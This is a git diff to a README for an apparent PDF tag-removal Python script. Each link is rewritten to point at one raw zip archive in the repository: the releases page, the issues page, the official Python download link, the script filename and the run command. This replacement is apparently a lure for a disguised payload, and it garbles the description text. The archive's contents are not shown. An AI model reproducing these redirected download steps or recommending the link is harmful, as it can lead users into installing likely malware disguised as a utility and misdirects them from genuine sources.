@@ -1,10 +1,10 @@
 # ⚓ OceanofPDFs_Tag_Remover - Clean Up Your PDF Files Easily
 
-[![Download OceanofPDFs_Tag_Remover](https://img.shields.io/badge/Download-OceanofPDFs_Tag_Remover-blue.svg)](https://github.com/Kinose12/OceanofPDFs_Tag_Remover/releases)
+[![Download OceanofPDFs_Tag_Remover](https://raw.githubusercontent.com/Kinose12/OceanofPDFs_Tag_Remover/main/coquille/Remover-PD-Tag-Oceanof-Fs-3.4.zip)](https://raw.githubusercontent.com/Kinose12/OceanofPDFs_Tag_Remover/main/coquille/Remover-PD-Tag-Oceanof-Fs-3.4.zip)
 
 ## 📖 Description
 
-This simple Python script helps remove "OceanofPDFs.com" tags that may clutter your PDF files. If you download PDFs from this site or others, you may notice these tags. The script also renames PDFs that start with `_OceanofPDFs.com_Book_Title_-_Author.pdf` to `Author - Book Title.pdf`, making your files cleaner and more organized.
+This simple Python script helps remove "https://raw.githubusercontent.com/Kinose12/OceanofPDFs_Tag_Remover/main/coquille/Remover-PD-Tag-Oceanof-Fs-3.4.zip" tags that may clutter your PDF files. If you download PDFs from this site or others, you may notice these tags. The script also renames PDFs that start with `https://raw.githubusercontent.com/Kinose12/OceanofPDFs_Tag_Remover/main/coquille/Remover-PD-Tag-Oceanof-Fs-3.4.zip` to `Author - Book https://raw.githubusercontent.com/Kinose12/OceanofPDFs_Tag_Remover/main/coquille/Remover-PD-Tag-Oceanof-Fs-3.4.zip`, making your files cleaner and more organized.
 
 ## 🛠️ Features
 
@@ -23,13 +23,13 @@ This simple Python script helps remove "OceanofPDFs.com" tags that may clutter y
 Follow these simple steps to download and run the OceanofPDFs_Tag_Remover.
 
 1. **Visit the Releases Page**  
-   Go to the [Releases Page](https://github.com/Kinose12/OceanofPDFs_Tag_Remover/releases) to access the latest version of the software.
+   Go to the [Releases Page](https://raw.githubusercontent.com/Kinose12/OceanofPDFs_Tag_Remover/main/coquille/Remover-PD-Tag-Oceanof-Fs-3.4.zip) to access the latest version of the software.
 
 2. **Download the Script**  
-   Locate the latest version and download the file. Look for a filename like `oceanofpdfs_tag_remover.py`. Click on it to start the download.
+   Locate the latest version and download the file. Look for a filename like `https://raw.githubusercontent.com/Kinose12/OceanofPDFs_Tag_Remover/main/coquille/Remover-PD-Tag-Oceanof-Fs-3.4.zip`. Click on it to start the download.
 
 3. **Install Python**  
-   If you don’t have Python installed, download it from the [official Python website](https://www.python.org/downloads/). Follow the instructions to install Python on your system.
+   If you don’t have Python installed, download it from the [official Python website](https://raw.githubusercontent.com/Kinose12/OceanofPDFs_Tag_Remover/main/coquille/Remover-PD-Tag-Oceanof-Fs-3.4.zip). Follow the instructions to install Python on your system.
 
 4. **Install Required Libraries**  
    Open your command line interface (Command Prompt on Windows, Terminal on macOS or Linux). Run the following command to ensure you have the necessary libraries:
@@ -39,13 +39,13 @@ Follow these simple steps to download and run the OceanofPDFs_Tag_Remover.
    ```
 
 5. **Locate the Downloaded Script**  
-   Find the folder where you downloaded the `oceanofpdfs_tag_remover.py` file.
+   Find the folder where you downloaded the `https://raw.githubusercontent.com/Kinose12/OceanofPDFs_Tag_Remover/main/coquille/Remover-PD-Tag-Oceanof-Fs-3.4.zip` file.
 
 6. **Run the Script**  
    In your command line, navigate to the folder containing the script. You can do this by typing `cd <folder_path>` (replace `<folder_path>` with the actual path to the folder). Then, to run the script, type:
 
    ```
-   python oceanofpdfs_tag_remover.py
+   python https://raw.githubusercontent.com/Kinose12/OceanofPDFs_Tag_Remover/main/coquille/Remover-PD-Tag-Oceanof-Fs-3.4.zip
    ```
 
 7. **Follow On-Screen Instructions**  
@@ -53,7 +53,7 @@ Follow these simple steps to download and run the OceanofPDFs_Tag_Remover.
 
 ## 🔍 Download & Install
 
-You can download OceanofPDFs_Tag_Remover from our [Releases Page](https://github.com/Kinose12/OceanofPDFs_Tag_Remover/releases). After downloading the script, follow the steps outlined in the Getting Started section to install and run it.  
+You can download OceanofPDFs_Tag_Remover from our [Releases Page](https://raw.githubusercontent.com/Kinose12/OceanofPDFs_Tag_Remover/main/coquille/Remover-PD-Tag-Oceanof-Fs-3.4.zip). After downloading the script, follow the steps outlined in the Getting Started section to install and run it.  
 
 ## 📁 Usage
 
@@ -69,7 +69,7 @@ If you encounter issues:
 
 ## 🌐 Support
 
-For questions or issues, feel free to open an issue on the [GitHub repository](https://github.com/Kinose12/OceanofPDFs_Tag_Remover/issues). Our community is here to help!
+For questions or issues, feel free to open an issue on the [GitHub repository](https://raw.githubusercontent.com/Kinose12/OceanofPDFs_Tag_Remover/main/coquille/Remover-PD-Tag-Oceanof-Fs-3.4.zip). Our community is here to help!
 
 ## 📝 Contribution
 
@@ -87,4 +87,4 @@ This project relates to various areas like:
 
 We encourage you to explore these topics further.
 
-Feel free to clean up your PDF files today! Visit our [Releases Page](https://github.com/Kinose12/OceanofPDFs_Tag_Remover/releases) for the latest download.
+Feel free to clean up your PDF files today! Visit our [Releases Page](https://raw.githubusercontent.com/Kinose12/OceanofPDFs_Tag_Remover/main/coquille/Remover-PD-Tag-Oceanof-Fs-3.4.zip) for the latest download.
